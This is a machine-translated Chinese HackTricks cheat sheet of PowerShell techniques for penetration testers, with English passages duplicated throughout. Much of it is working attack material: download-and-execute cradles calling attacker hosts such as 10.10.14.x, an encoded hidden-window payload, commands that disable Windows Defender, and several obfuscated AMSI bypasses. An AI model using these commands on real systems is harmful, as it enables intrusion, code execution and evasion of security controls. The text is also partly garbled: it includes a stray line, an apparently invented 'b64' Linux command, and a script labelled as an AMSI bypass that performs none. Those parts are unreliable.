# Pentesters的基本PowerShell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 默认的PowerShell位置
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## 开始的基本PS命令

Here are some basic PowerShell commands to get started:

以下是一些基本的PowerShell命令，供您开始使用：

### Get-Command

Get-Command is used to retrieve a list of available commands in PowerShell.

Get-Command 用于检索PowerShell中可用的命令列表。

### Get-Help

Get-Help is used to display the help information for a specific command.

Get-Help 用于显示特定命令的帮助信息。

### Get-Process

Get-Process is used to retrieve a list of running processes on the system.

Get-Process 用于检索系统上正在运行的进程列表。

### Get-Service

Get-Service is used to retrieve a list of services running on the system.

Get-Service 用于检索系统上正在运行的服务列表。

### Get-EventLog

Get-EventLog is used to retrieve the events from the event logs on the system.

Get-EventLog 用于从系统的事件日志中检索事件。

### Get-WmiObject

Get-WmiObject is used to retrieve information from Windows Management Instrumentation (WMI) objects.

Get-WmiObject 用于从Windows管理工具（WMI）对象中检索信息。

### Get-ChildItem

Get-ChildItem is used to retrieve a list of files and directories in a specified location.

Get-ChildItem 用于检索指定位置的文件和目录列表。

### Set-ExecutionPolicy

Set-ExecutionPolicy is used to set the execution policy for PowerShell scripts.

Set-ExecutionPolicy 用于设置PowerShell脚本的执行策略。

### Start-Process

Start-Process is used to start a new process.

Start-Process 用于启动一个新进程。

### Stop-Process

Stop-Process is used to stop a running process.

Stop-Process 用于停止正在运行的进程。

### Out-File

Out-File is used to send output to a file.

Out-File 用于将输出发送到文件。

### Remove-Item

Remove-Item is used to remove a file or directory.

Remove-Item 用于删除文件或目录。

### New-Item

New-Item is used to create a new file or directory.

New-Item 用于创建新文件或目录。

### Copy-Item

Copy-Item is used to copy a file or directory.

Copy-Item 用于复制文件或目录。

### Move-Item

Move-Item is used to move a file or directory.

Move-Item 用于移动文件或目录。

### Rename-Item

Rename-Item is used to rename a file or directory.

Rename-Item 用于重命名文件或目录。

These are just a few examples of the basic PowerShell commands you can use. PowerShell is a powerful scripting language that can be used for various purposes in a Windows environment.

这些只是一些基本的PowerShell命令示例，您可以使用PowerShell在Windows环境中进行各种用途的脚本编写。
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## 下载和执行

To download and execute a file using PowerShell, you can use the following command:

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OutputFile>; .\<OutputFile>
```

Replace `<URL>` with the URL of the file you want to download, and `<OutputFile>` with the desired name for the downloaded file.

使用PowerShell下载和执行文件，可以使用以下命令：

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OutputFile>; .\<OutputFile>
```

将`<URL>`替换为要下载的文件的URL，将`<OutputFile>`替换为下载文件的所需名称。

## Execute PowerShell Script from Memory

To execute a PowerShell script from memory, you can use the following command:

```powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```

Replace `<URL>` with the URL of the script you want to execute.

从内存中执行PowerShell脚本，可以使用以下命令：

```powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```

将`<URL>`替换为要执行的脚本的URL。

## Execute Encoded PowerShell Script

To execute an encoded PowerShell script, you can use the following command:

```powershell
powershell.exe -EncodedCommand <EncodedScript>
```

Replace `<EncodedScript>` with the base64-encoded version of the script you want to execute.

执行编码的PowerShell脚本，可以使用以下命令：

```powershell
powershell.exe -EncodedCommand <EncodedScript>
```

将`<EncodedScript>`替换为要执行的脚本的base64编码版本。

## Execute PowerShell Script without Execution Policy

To execute a PowerShell script without the execution policy restrictions, you can use the following command:

```powershell
powershell.exe -ExecutionPolicy Bypass -File <ScriptFile>
```

Replace `<ScriptFile>` with the path to the script file you want to execute.

在没有执行策略限制的情况下执行PowerShell脚本，可以使用以下命令：

```powershell
powershell.exe -ExecutionPolicy Bypass -File <ScriptFile>
```

将`<ScriptFile>`替换为要执行的脚本文件的路径。

## Execute PowerShell Command as a Different User

To execute a PowerShell command as a different user, you can use the following command:

```powershell
Start-Process powershell.exe -Credential <Username> -ArgumentList '-Command "<Command>"'
```

Replace `<Username>` with the username of the desired user and `<Command>` with the PowerShell command you want to execute.

以不同用户身份执行PowerShell命令，可以使用以下命令：

```powershell
Start-Process powershell.exe -Credential <Username> -ArgumentList '-Command "<Command>"'
```

将`<Username>`替换为所需用户的用户名，将`<Command>`替换为要执行的PowerShell命令。
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### 使用 AMSI Bypass 后台下载和执行

```powershell
$URL = "http://example.com/malicious_payload.exe"
$Output = "C:\Temp\malicious_payload.exe"

# 创建一个 WebClient 对象
$WebClient = New-Object System.Net.WebClient

# 下载恶意载荷
$WebClient.DownloadFile($URL, $Output)

# 执行恶意载荷
Start-Process -FilePath $Output -WindowStyle Hidden
```

这个脚本使用了 AMSI Bypass 技术，在后台下载和执行恶意载荷。

```powershell
$URL = "http://example.com/malicious_payload.exe"
$Output = "C:\Temp\malicious_payload.exe"

# Create a WebClient object
$WebClient = New-Object System.Net.WebClient

# Download the malicious payload
$WebClient.DownloadFile($URL, $Output)

# Execute the malicious payload
Start-Process -FilePath $Output -WindowStyle Hidden
```

This script uses AMSI Bypass technique to download and execute a malicious payload in the background.
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### 在Linux中使用b64

The `b64` command in Linux is used to encode and decode Base64 data. It is a useful tool for manipulating and working with data in Base64 format.

To encode a file using `b64`, you can use the following command:

```bash
b64 -e <input_file> > <output_file>
```

This command will take the contents of the `<input_file>`, encode it in Base64, and save the encoded data in the `<output_file>`.

To decode a file using `b64`, you can use the following command:

```bash
b64 -d <input_file> > <output_file>
```

This command will take the contents of the `<input_file>`, decode it from Base64, and save the decoded data in the `<output_file>`.

You can also use `b64` to encode or decode data directly from the command line. For example, to encode a string, you can use the following command:

```bash
echo -n "Hello, World!" | b64 -e
```

This command will encode the string "Hello, World!" in Base64 and print the encoded data to the console.

Similarly, to decode a Base64 string, you can use the following command:

```bash
echo -n "SGVsbG8sIFdvcmxkIQ==" | b64 -d
```

This command will decode the Base64 string "SGVsbG8sIFdvcmxkIQ==" and print the decoded data to the console.

Using the `b64` command in Linux can be helpful for various tasks, such as encoding or decoding data for transmission or storage.
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## 下载

### System.Net.WebClient

您可以使用`System.Net.WebClient`类在PowerShell中进行文件下载。这个类提供了一些方法来下载文件并保存到本地计算机上。

#### DownloadFile 方法

`DownloadFile`方法用于下载文件并保存到指定的路径。以下是使用`DownloadFile`方法的示例代码：

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"
$filePath = "C:\path\to\save\file.txt"

$webClient.DownloadFile($url, $filePath)
```

在上面的示例中，我们创建了一个`System.Net.WebClient`对象，并指定了要下载的文件的URL和要保存的文件路径。然后，我们调用`DownloadFile`方法来执行下载操作。

#### DownloadData 方法

`DownloadData`方法用于下载文件并将其作为字节数组返回。以下是使用`DownloadData`方法的示例代码：

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"

$fileData = $webClient.DownloadData($url)
```

在上面的示例中，我们创建了一个`System.Net.WebClient`对象，并指定了要下载的文件的URL。然后，我们调用`DownloadData`方法来执行下载操作，并将下载的文件数据保存在`$fileData`变量中。

#### DownloadString 方法

`DownloadString`方法用于下载文件并将其作为字符串返回。以下是使用`DownloadString`方法的示例代码：

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"

$fileContent = $webClient.DownloadString($url)
```

在上面的示例中，我们创建了一个`System.Net.WebClient`对象，并指定了要下载的文件的URL。然后，我们调用`DownloadString`方法来执行下载操作，并将下载的文件内容保存在`$fileContent`变量中。

#### 使用代理服务器

如果您需要通过代理服务器进行下载，可以使用`Proxy`属性来设置代理服务器的地址。以下是使用代理服务器进行下载的示例代码：

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"
$proxyAddress = "http://proxy.example.com:8080"

$webClient.Proxy = New-Object System.Net.WebProxy($proxyAddress)

$webClient.DownloadFile($url, $filePath)
```

在上面的示例中，我们创建了一个`System.Net.WebClient`对象，并指定了要下载的文件的URL。然后，我们创建了一个`System.Net.WebProxy`对象，并将其赋值给`Proxy`属性，以设置代理服务器的地址。最后，我们调用`DownloadFile`方法来执行下载操作。

#### 异步下载

如果您需要在后台执行下载操作，可以使用`DownloadFileAsync`、`DownloadDataAsync`和`DownloadStringAsync`方法。这些方法将在后台线程中执行下载操作，并在下载完成时触发相应的事件。

以下是使用`DownloadFileAsync`方法的示例代码：

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://example.com/file.txt"
$filePath = "C:\path\to\save\file.txt"

$webClient.DownloadFileAsync($url, $filePath)
```

在上面的示例中，我们创建了一个`System.Net.WebClient`对象，并指定了要下载的文件的URL和要保存的文件路径。然后，我们调用`DownloadFileAsync`方法来执行异步下载操作。

#### 注意事项

在使用`System.Net.WebClient`类进行文件下载时，请注意以下几点：

- 请确保您有合法的权限来下载文件。
- 请确保您下载的文件是合法和安全的。
- 请遵守适用的法律和规定。

以上是使用`System.Net.WebClient`类在PowerShell中进行文件下载的基本方法。您可以根据自己的需求选择适合的方法来下载文件。
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
### Invoke-WebRequest

`Invoke-WebRequest` 是一个强大的 PowerShell cmdlet，用于在命令行中执行 HTTP 请求。它可以用于与 Web 服务器进行交互，发送 GET、POST 和其他类型的请求，并接收服务器的响应。

#### 语法

```powershell
Invoke-WebRequest [-Uri] <string> [-Method <string>] [-Headers <hashtable>] [-Body <string>] [-ContentType <string>] [-UserAgent <string>] [-Proxy <Uri>] [-ProxyCredential <PSCredential>] [-TimeoutSec <int>] [-SessionVariable <string>] [-WebSession <WebRequestSession>] [-UseBasicParsing] [<CommonParameters>]
```

#### 参数

- `-Uri`：指定要请求的 URL。
- `-Method`：指定请求的方法，如 GET、POST 等。默认为 GET。
- `-Headers`：指定请求的头部信息。
- `-Body`：指定请求的主体内容。
- `-ContentType`：指定请求的内容类型。
- `-UserAgent`：指定请求的用户代理。
- `-Proxy`：指定代理服务器的 URL。
- `-ProxyCredential`：指定代理服务器的凭据。
- `-TimeoutSec`：指定请求的超时时间（以秒为单位）。
- `-SessionVariable`：指定将响应保存到的变量。
- `-WebSession`：指定要使用的 Web 会话。
- `-UseBasicParsing`：使用基本解析器来解析 HTML 响应。

#### 示例

发送 GET 请求：

```powershell
Invoke-WebRequest -Uri "https://example.com"
```

发送 POST 请求：

```powershell
Invoke-WebRequest -Uri "https://example.com" -Method POST -Body "param1=value1&param2=value2"
```

发送带有自定义头部的请求：

```powershell
$headers = @{
    "Authorization" = "Bearer token123"
    "Content-Type" = "application/json"
}

Invoke-WebRequest -Uri "https://example.com" -Headers $headers
```

#### 注意事项

- `Invoke-WebRequest` 默认使用 IE 解析器来解析 HTML 响应。如果遇到解析问题，可以使用 `-UseBasicParsing` 参数来使用基本解析器。
- `Invoke-WebRequest` 可以与 `Invoke-RestMethod` 结合使用，用于处理 RESTful API 请求和响应。
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget is a command-line utility that allows you to download files from the web. It supports downloading files using various protocols such as HTTP, HTTPS, and FTP. Wget is commonly used in scripting and automation tasks.

To use Wget, you need to open a command prompt or terminal and enter the following command:

```
wget [options] [URL]
```

Here are some commonly used options:

- `-O`: Specifies the output file name.
- `-P`: Specifies the directory where the downloaded file will be saved.
- `-c`: Resumes a previous download if it was interrupted.
- `-r`: Recursively downloads files from a specified URL.
- `-np`: Limits the recursion to the same directory level.
- `-A`: Specifies a comma-separated list of file extensions to accept during download.
- `-U`: Specifies the user agent string to send to the server.

For example, to download a file named `example.txt` from a website, you can use the following command:

```
wget -O example.txt http://www.example.com/file.txt
```

This will download the file and save it as `example.txt` in the current directory.

Wget is a powerful tool that can be used for various purposes, such as downloading files for analysis, scraping websites, or automating repetitive tasks.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

BitsTransfer 是一种在 Windows 操作系统中使用 PowerShell 进行文件传输的工具。它允许你通过 HTTP 或 HTTPS 协议从远程服务器下载文件，并且支持断点续传功能。BitsTransfer 是一种非常有用的工具，特别适用于在渗透测试中获取目标系统上的敏感文件。

#### 下载文件

你可以使用 `Start-BitsTransfer` 命令来下载文件。以下是一个示例：

```powershell
Start-BitsTransfer -Source http://example.com/file.txt -Destination C:\path\to\save\file.txt
```

在上面的示例中，我们使用 `Start-BitsTransfer` 命令从 `http://example.com/file.txt` 下载文件，并将其保存到本地的 `C:\path\to\save\file.txt` 路径下。

#### 断点续传

BitsTransfer 支持断点续传功能，这意味着如果下载过程中出现中断，你可以在恢复下载时从中断的位置继续下载。这对于大文件的下载非常有用。

要启用断点续传功能，你需要使用 `-TransferType` 参数并将其设置为 `Recover`。以下是一个示例：

```powershell
Start-BitsTransfer -Source http://example.com/largefile.zip -Destination C:\path\to\save\largefile.zip -TransferType Recover
```

在上面的示例中，我们使用 `Start-BitsTransfer` 命令从 `http://example.com/largefile.zip` 下载大文件，并将其保存到本地的 `C:\path\to\save\largefile.zip` 路径下。通过设置 `-TransferType` 参数为 `Recover`，我们启用了断点续传功能。

#### 限制带宽

如果你想限制下载过程中的带宽使用，可以使用 `-Priority` 参数来设置下载任务的优先级。以下是一些可用的优先级选项：

- `Foreground`：前台优先级，使用最高带宽。
- `High`：高优先级，使用较高带宽。
- `Normal`：正常优先级，使用默认带宽。
- `Low`：低优先级，使用较低带宽。
- `Background`：后台优先级，使用最低带宽。

以下是一个示例：

```powershell
Start-BitsTransfer -Source http://example.com/file.txt -Destination C:\path\to\save\file.txt -Priority Low
```

在上面的示例中，我们使用 `Start-BitsTransfer` 命令从 `http://example.com/file.txt` 下载文件，并将其保存到本地的 `C:\path\to\save\file.txt` 路径下。通过设置 `-Priority` 参数为 `Low`，我们限制了下载任务的带宽使用。

#### 总结

BitsTransfer 是一个强大的工具，可以在渗透测试中帮助你下载目标系统上的文件。它支持断点续传功能和带宽限制，使得文件传输更加灵活和可控。
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

### Base64 Kali

在渗透测试中，我们经常需要在目标系统上执行命令。为了避免在网络上传输明文命令，我们可以使用Base64编码来对命令进行编码。在Kali Linux中，我们可以使用`base64`命令来进行编码和解码。

要对命令进行编码，可以使用以下命令：

```bash
echo -n 'command' | base64
```

要对编码后的命令进行解码，可以使用以下命令：

```bash
echo -n 'encoded_command' | base64 -d
```

### EncodedCommand

在使用PowerShell进行渗透测试时，我们可以使用`EncodedCommand`参数来执行Base64编码的命令。这可以帮助我们绕过一些安全限制，如命令行长度限制。

要执行Base64编码的命令，可以使用以下命令：

```powershell
powershell.exe -EncodedCommand 'base64_encoded_command'
```

请注意，`base64_encoded_command`是经过Base64编码的命令字符串。

使用`EncodedCommand`参数时，我们需要确保命令没有换行符，否则将无法正确执行。可以使用以下命令来删除换行符：

```bash
echo -n 'command' | base64 | tr -d '\n'
```

这样，我们就可以使用Base64编码和`EncodedCommand`参数来执行命令，以便在渗透测试中绕过一些限制。
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [执行策略](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [受限语言](broken-reference/)

## [AppLocker策略](broken-reference/)

## 启用WinRM（远程PS）
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## 禁用Defender

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### AMSI绕过

**`amsi.dll`**被**加载**到您的进程中，并具有任何应用程序与之交互所需的**导出函数**。由于它被加载到您控制的进程的内存空间中，您可以通过**覆盖内存中的指令**来改变其行为，使其无法检测到任何内容。

因此，您的目标是通过在内存中**覆盖该DLL的指令**，使检测变得无效。

**AMSI绕过生成器**网页：[**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### AMSI绕过2-托管API调用挂钩

查看[**此帖子以获取详细信息**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)和[**代码**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)。

这种新技术依赖于对.NET方法的API调用挂钩。事实证明，.NET方法需要在内存中编译为本机机器指令，这些指令看起来非常类似于本机方法。这些编译后的方法可以被挂钩以改变程序的控制流。

执行.NET方法的API调用挂钩的步骤如下：

1. 确定要挂钩的目标方法
2. 定义一个与目标方法具有相同函数原型的方法
3. 使用反射找到这些方法
4. 确保每个方法已经被编译
5. 找到每个方法在内存中的位置
6. 用指向我们恶意方法的指令覆盖目标方法

## PS-History
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## 获取权限

To determine the permissions of a file or directory in PowerShell, you can use the `Get-Acl` cmdlet. This cmdlet retrieves the access control list (ACL) for the specified object.

```powershell
Get-Acl -Path C:\path\to\file.txt
```

This command will display the permissions associated with the file.txt file, including the owner, group, and individual user permissions.

To retrieve the permissions for a directory and all its contents, you can use the `-Recurse` parameter:

```powershell
Get-Acl -Path C:\path\to\directory -Recurse
```

This command will display the permissions for the specified directory and all its subdirectories and files.

You can also filter the output to display only specific properties of the ACL, such as the owner or the access rules. For example, to display only the access rules for a file, you can use the `Access` property:

```powershell
(Get-Acl -Path C:\path\to\file.txt).Access
```

This command will display only the access rules for the file.txt file.

By using the `Get-Acl` cmdlet, you can easily retrieve and analyze the permissions of files and directories in PowerShell.
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## 操作系统版本和热补丁

To obtain information about the operating system version and installed hotfixes, you can use the following PowerShell commands:

```powershell
# 获取操作系统版本
(Get-WmiObject -Class Win32_OperatingSystem).Caption

# 获取已安装的热补丁
Get-HotFix
```

The first command retrieves the operating system version using the `Win32_OperatingSystem` class. The `Caption` property contains the name of the operating system.

The second command retrieves a list of installed hotfixes using the `Get-HotFix` cmdlet. This will provide information such as the hotfix ID, description, and installation date.

By running these commands, you can gather important information about the target system's operating system version and applied hotfixes. This information can be useful for identifying vulnerabilities and determining the level of patching on the system.
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## 环境

The following tools and technologies are required to follow the examples in this guide:

- Windows operating system (Windows 7 or higher)
- PowerShell (version 2.0 or higher)

## 必要环境

为了跟随本指南中的示例，需要以下工具和技术：

- Windows操作系统（Windows 7或更高版本）
- PowerShell（2.0版本或更高版本）

## Introduction

PowerShell is a powerful scripting language and automation framework that is built on top of the .NET framework. It provides a command-line shell and a scripting language that can be used to automate administrative tasks and perform system management tasks.

In the context of penetration testing, PowerShell can be a valuable tool for attackers as it provides a way to execute commands and scripts on a target system. It can be used to gather information about the target, exploit vulnerabilities, and maintain persistence on compromised systems.

This guide will cover some basic PowerShell techniques that can be useful for penetration testers. It will provide an overview of PowerShell syntax, common cmdlets, and techniques for executing commands and scripts.

## 简介

PowerShell是一种强大的脚本语言和自动化框架，构建在.NET框架之上。它提供了一个命令行shell和一个脚本语言，可用于自动化管理任务和执行系统管理任务。

在渗透测试的背景下，PowerShell可以成为攻击者的有力工具，因为它提供了一种在目标系统上执行命令和脚本的方式。它可以用于收集有关目标的信息，利用漏洞，并在受损系统上保持持久性。

本指南将介绍一些对渗透测试人员有用的基本PowerShell技术。它将概述PowerShell语法、常见的cmdlet和执行命令和脚本的技术。
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## 其他连接的驱动器

In some cases, you may need to access or gather information from other connected drives on a Windows system. This can be useful for lateral movement or data exfiltration during a penetration test. Here are some PowerShell commands that can help you achieve this:

在某些情况下，您可能需要访问或收集Windows系统上其他连接的驱动器的信息。这对于渗透测试期间的横向移动或数据泄露非常有用。以下是一些可以帮助您实现此目的的PowerShell命令：

